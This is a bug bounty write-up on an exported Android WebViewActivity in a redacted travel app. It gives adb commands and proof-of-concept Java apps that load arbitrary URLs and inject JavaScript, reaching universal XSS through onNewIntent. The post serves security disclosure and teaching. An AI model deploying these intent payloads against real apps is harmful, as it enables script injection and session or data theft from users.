# :globe_with_meridians: Bounty of an Insecure WebView (Part 1): XSS, but with Steroids

---

## The Bug(s)

This time, the target is an international online travel application from Singapore. Again, due to the non-disclosure policy let’s call the application as redacted okay? 😉

After installing the app from playstore, I pull the .apk file from my android device to my pc with adb (Android Debug Bridge):

- Identifying the package name of the app

```
adb shell pm list packages
```

2. Get the full path name of the .apk file

```
adb shell pm path com.redacted.someapp
```

3. Using the full path name from Step 2, pull the .apk file from the device to my pc

```
adb pull /data/app/com.redacted.someapp/base.apk path/to/destination
```

### Arbitrary URL x Webview

As usual, I began the code analysis with jadx-gui tools to decompile the APK file. After decompiling the APK, I examined the *AndroidManifest.xml* file to identify possible attack surfaces. There’s one of them that look like this:

```
<activity android:configChanges="orientation|screenSize" android:exported="true" android:label="@string/com_login_button" android:launchMode="singleTop" android:name="com.redactedthirdparty.auth.authorization.authcode.WebViewActivity" android:windowSoftInputMode="adjustResize">
<intent-filter>
<action android:name="android.intent.action.MAIN"/>
<category android:name="android.intent.category.DEFAULT"/>
</intent-filter>
</activity>
```

WebViewActivity? Being Exported?? Something already smells fishy at this point 🤔. As I mentioned in my previous post, WebViewActivity (or any activity that passes a URI to WebViewActivity) could be dangerous if it’s being exported, especially if the URL is not being validated. This is because being exported means any other application can access this activity and load the URL being passed to the WebView.

Time to investigate more of this com.redactedthirdparty.auth.authorization.authcode.WebViewActivity thing 🥸.

```
private static final int IMAGE_REQUEST_CODE = 9999;
public static final String KEY_EXCEPTION = "key.exception";
public static final String KEY_EXTRA_HEADERS = "key.extra.headers";
public static final String KEY_REDIRECT_URL = "key.redirect.url";
public static final String KEY_RESULT_RECEIVER = "key.result.receiver";
public static final String KEY_URL = "key.url";
public static final String KEY_USE_SMS_RECEIVER = "key.use.sms.receiver";
public static final String KEY_USE_WEBVIEW_TIMERS = "key.use.webview.timers";
public static final int RESULT_ERROR = 1;
public static final int RESULT_SUCCESS = 0;
private static SmsReceiver smsReceiver;
public final Map<String, String> headers = new HashMap();
public ValueCallback<Uri> imageCallback;
public ValueCallback<Uri[]> lollipopImageCallback;
private ProgressBar progressBar;
private ResultReceiver resultReceiver;
public boolean shouldProceedWithSslError;
private String url;
private boolean useSmsReceiver;
private boolean useWebViewTimers;
public WebView webView;

@SuppressLint({"SetJavaScriptEnabled"})
private void initUi() {
this.webView = (WebView) findViewById(R.id.webview);
this.progressBar = (ProgressBar) findViewById(R.id.progress_bar);
this.webView.setBackgroundResource(17170443);
this.webView.setVerticalScrollBarEnabled(false);
this.webView.setHorizontalScrollBarEnabled(false);
this.webView.setWebViewClient(new RedactedWebViewClient());
this.webView.setWebChromeClient(new RedactedWebChromeClient());
this.webView.getSettings().setJavaScriptEnabled(true);
this.webView.getSettings().setSaveFormData(RedactedSDK.getAdapter().getSessionConfig().isSaveFormData());
this.webView.getSettings().setSavePassword(false);
setProgressBarVisibility(0);
this.webView.loadUrl(this.url, this.headers);
}

private void parseIntent(Intent intent) {
this.url = intent.getStringExtra(KEY_URL);
this.useWebViewTimers = intent.getBooleanExtra(KEY_USE_WEBVIEW_TIMERS, false);
this.useSmsReceiver = intent.getBooleanExtra(KEY_USE_SMS_RECEIVER, false);
this.resultReceiver = (ResultReceiver) intent.getParcelableExtra(KEY_RESULT_RECEIVER);
Bundle bundle = (Bundle) intent.getParcelableExtra(KEY_EXTRA_HEADERS);
this.headers.put(CommonProtocol.KA_HEADER_KEY, SystemInfo.getKAHeader());
if (bundle == null || bundle.isEmpty()) {
return;
}
for (String str : bundle.keySet()) {
this.headers.put(str, bundle.getString(str));
}
}

protected void onCreate(Bundle bundle) {
try {
requestWindowFeature(1);
super.onCreate(bundle);
parseIntent(getIntent());
setContentView(R.layout.activity_redacted_webview);
initUi();
registerSmsReceiverIfNeeded();
} catch (Exception e) {
sendErrorToListener(e);
finish();
}
}
```

Here’s what happened:

- When the WebViewActivityfirst created, onCreate() is called.

- on parseIntent(), the incoming intent will be handled and the extra intent data (KEY_URL, KEY_USE_WEBVIEW_TIMERS, KEY_USE_SMS_RECEIVER, etc.) will be stored into variables.

- The url data comes with “key.url” as the key and the url itself as the value, which will be handled by parseIntent() and store it in *this.url*.

- initUI() is where the WebView settings being configured and also will load the *this.url* into the webview.

>

What is extra data? When calling another app component, an intent can bring additional piece of information called extra data (or extras). This extra data provides specific details or context for the intended action, allowing the receiving component to understand and respond appropriately.

In our case, we need to define an extras with “key.url”as key and url as value to our intent, so it will be like this:

*sending intent with extras*

>

*If you want to know more about intents and its attributes, you can check *[https://developer.android.com/reference/android/content/Intent](https://developer.android.com/reference/android/content/Intent)*. As for now, let’s get back to the analysis.*

According to the code, the passed url seems like not being validated at all, which means we can supply this webview with any url we like. However, we can’t use deeplink method to launch the webview like before due to the intent filter is not being defined in the AndroidManifest. We have to use other apk to pass the intent containing our webhook in the extras.

But it would be inefficient to build an apk everytime we want to test something, right? Relax, we can test it with this bad boy:

```
adb shell am start -n "com.redacted.someapp/com.redactedthirdparty.auth.authorization.authcode.WebViewActivity" --es "key.url" "https://eoms029u34bbupq.m.pipedream.net"
```

- `adb shell : adb command to execute shell commands on Android device`

- `am start : Specifies that we want to start an Android activity.`

- `- n : Specifying "package_name/activity_name"`

- `— es : Specifying “extras_key” “extras_value”`

*request & response on the webview*

Sweet! Now our url is loaded, we can build our proof-of-concept apk:

## Get Crisdeo Nuel Siahaan’s stories in your inbox

Join Medium for free to get updates from this writer.

Remember me for faster sign in

AndroidManifest.xml

```
<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
xmlns:tools="http://schemas.android.com/tools">

<application
android:allowBackup="true"
android:dataExtractionRules="@xml/data_extraction_rules"
android:fullBackupContent="@xml/backup_rules"
android:icon="@mipmap/ic_launcher"
android:label="@string/app_name"
android:supportsRtl="true"
android:theme="@style/Theme.Hacked"
tools:targetApi="31">
<activity
android:name=".MainActivity"
android:exported="true">
<intent-filter>
<action android:name="android.intent.action.MAIN"/>
<category android:name="android.intent.category.LAUNCHER"/>
</intent-filter>
</activity>

</application>

</manifest>
```

MainActivity.java

```
package com.ngobrol.hacked;

import androidx.appcompat.app.AppCompatActivity;

import android.content.Intent;
import android.os.Bundle;
import android.util.Log;

public class MainActivity extends AppCompatActivity {

@Override
protected void onCreate(Bundle savedInstanceState) {
super.onCreate(savedInstanceState);
setContentView(R.layout.activity_main);

Intent extra = new Intent("android.intent.action.VIEW");
extra.setClassName("com.redacted.someapp","com.redactedthirdparty.auth.authorization.authcode.WebViewActivity");
extra.putExtra("key.url","https://eoms029u34bbupq.m.pipedream.net");

startActivity(extra);
}
}
```

Make sure the apk performed the same as what we did with the adb command. Therefore, we got our first bug: Lack of validation leads to arbitrary URLs loaded in Exported WebView. But can we do more?

### Making our way to Evil JS Execution

In the target app’s initUI() method, it has webview settings attribute *setJavaScriptEnabled(true)*. It’s quite self-explanatory, it means the settings tells the WebView to enable JavaScript execution. So not only attacker can make user visit the malicious url, malicious javascript could be executed as well.

Here’s the modified poc apk to test:

MainActivity.java

```
package com.ngobrol.hacked;

import androidx.appcompat.app.AppCompatActivity;

import android.content.Intent;
import android.os.Bundle;
import android.util.Log;

public class MainActivity extends AppCompatActivity {

@Override
protected void onCreate(Bundle savedInstanceState) {
super.onCreate(savedInstanceState);
setContentView(R.layout.activity_main);

Intent extra = new Intent("android.intent.action.VIEW");
extra.setClassName("com.redacted.someapp","com.redactedthirdparty.auth.authorization.authcode.WebViewActivity");
extra.putExtra("key.url","javascript:alert('hehe')");

startActivity(extra);
}
}
```

*Evil JS Execution*

Splendid!

Moreover, using “javascript:” isn’t the sole method for attackers to execute JavaScript payloads through the WebView. Victims who visit websites with malicious JavaScript embedded will also be affected. And that’s how enabling `setJavaScriptEnabled(true)`helps escalate the impact to Evil JavaScript Execution.

BUT CAN WE DO MORE???

### Universal XSS

*Universal XSS*

Universal XSS (UXSS) is a type of XSS attack that typically occurs in browsers or browser extensions, generating an XSS condition. Unlike traditional XSS, its sibling, UXSS doesn’t require a vulnerable web page to trigger the XSS. Instead, the XSS can be triggered on any web page opened through the vulnerable browser, thereby creating a vulnerability where none existed in the first place.

In our case, let’s take a look at the code:

*onCreate and onNewIntent*

Quoted from [oversecured.com](https://blog.oversecured.com/Android-security-checklist-webview/#universal-xss): `onNewIntent` is a method that is called each time the activity receives a new Intent. Since `onNewIntent` also call “parseIntent()” and load a new URL, we could smuggle JavaScript code to be executed on the WebView.

So, to achieve Universal XSS, I constructed my proof-of-concept app like this:

MainActivity.java

```
package com.ngobrol.hackeduxss;
import androidx.appcompat.app.AppCompatActivity;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.os.Handler;

public class MainActivity extends AppCompatActivity {

@Override
protected void onCreate(Bundle savedInstanceState) {
super.onCreate(savedInstanceState);
setContentView(R.layout.activity_main);
Intent intent = new Intent("android.intent.action.VIEW");
intent.setClassName("com.redacted.someapp","com.redactedthirdparty.auth.authorization.authcode.WebViewActivity");
intent.putExtra("key.url","https://example.com");//url of any websites you want to set the xss
startActivity(intent);
new Handler().postDelayed(() -> {
Intent second = new Intent("android.intent.action.VIEW");
second.setClassName("com.redacted.someapp","com.redactedthirdparty.auth.authorization.authcode.WebViewActivity");
second.putExtra("key.url","javascript:alert(document.domain)");//malicious js here
startActivity(second);
}, 3000);
}
}
```

When it is first run, it opens a website on which we want to set up the XSS. After a short period of time, JavaScript code is injected and executed on the website.

*Achieved UXSS*

We successfully achieved an XSS attack on http://example.com, not because the domain was already vulnerable, but because we injected JavaScript code to be executed there. Just like that, you can perform XSS attacks on any domain we specify using this method.

So, that’s it! Thank you for reading this article. In the next part, we will discuss how to escalate this vulnerable web view to steal the victim’s personal files. Stay Tuned!

Stay Curious!

---
